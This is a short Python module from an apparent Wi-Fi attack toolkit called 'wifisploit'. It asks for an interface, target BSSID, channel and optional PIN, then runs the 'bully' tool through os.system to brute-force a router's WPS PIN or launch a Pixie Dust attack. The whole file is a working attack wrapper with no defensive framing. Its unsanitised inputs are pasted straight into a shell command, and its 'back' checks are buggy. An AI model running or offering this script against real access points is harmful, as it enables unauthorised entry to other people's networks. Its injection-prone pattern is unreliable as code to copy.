# wifisploit/modules/wps_attack.py

import os

a = '\033[0;31m'
b = '\033[0;32m'
c = '\033[0;37m'
d = '\033[1;37m'

interface = input(f'{d}wsf ({a}Interface{d})> {c}')
if interface.lower() == 'back':
	quit()
else:
	print(f'{d}Interface => {b}{interface}')

bssid = input(f'{d}wsf ({a}BSSID{d})> {c}')
if bssid.lower() == 'back':
	quit()
else:
	print(f'{d}BSSID => {b}{bssid}')

channel = int(input(f'{d}wsf ({a}Channel{d})> {c}'))
if channel == 'back':
	quit()
else:
	print(f'{d}Channel => {b}{channel}')

user = input(f'\n{d}Do you have PIN? [y/N] {c}')
if user.lower() == 'y' or user.lower() == 'yes':
	pin = int(input(f'{d}wsf ({a}PIN{d})> {c}'))
	if bssid.lower() == 'back':
		quit()
	else:
		print(f'{d}PIN => {b}{pin}')
	os.system(f'bully -b {bssid} -c {channel} --bruteforce -p {pin} {interface}')
else:
	os.system(f'bully -b {bssid} -c {channel} --force --pixiewps {interface}')
